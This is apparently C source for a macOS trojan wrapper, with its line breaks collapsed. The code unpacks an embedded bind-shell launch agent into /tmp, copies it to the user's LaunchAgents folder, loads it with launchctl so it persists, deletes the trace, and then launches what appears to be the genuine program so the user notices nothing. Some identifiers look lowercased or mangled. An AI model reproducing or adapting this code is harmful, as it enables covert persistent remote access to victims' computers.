#include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <string.h> #include <errno.h> #include "common.h" #define unpack_silent 1 #include "pack.c" #define buf_size 10000 char *bindshell_data = (char *)(ldr_patch_addr); void unpackbindshell(void) { char fn[buf_size]; char cmd[buf_size]; snprintf(fn, buf_size - 1, "/tmp/%s", plist_name); unpack(fn, bindshell_data, strlen(bindshell_data)); snprintf(cmd, buf_size - 1, "cp %s ~/library/launchagents", fn); system(cmd); system("launchctl load ~/library/launchagents"); snprintf(cmd, buf_size - 1, "rm -f %s", fn); system(cmd); } int main(int argc, char **argv) { char const * const progname = argv[0]; char fn[buf_size]; char cwd[buf_size]; getcwd(cwd, buf_size - 1); fn[0] = '\0'; if (progname[0] != '/') snprintf(fn, buf_size - 1, "%s/", cwd); strncat(fn, progname, buf_size - 1); fn[strlen(fn) - 1] = '2'; unpackbindshell(); execl(fn, fn, null); return 0; } 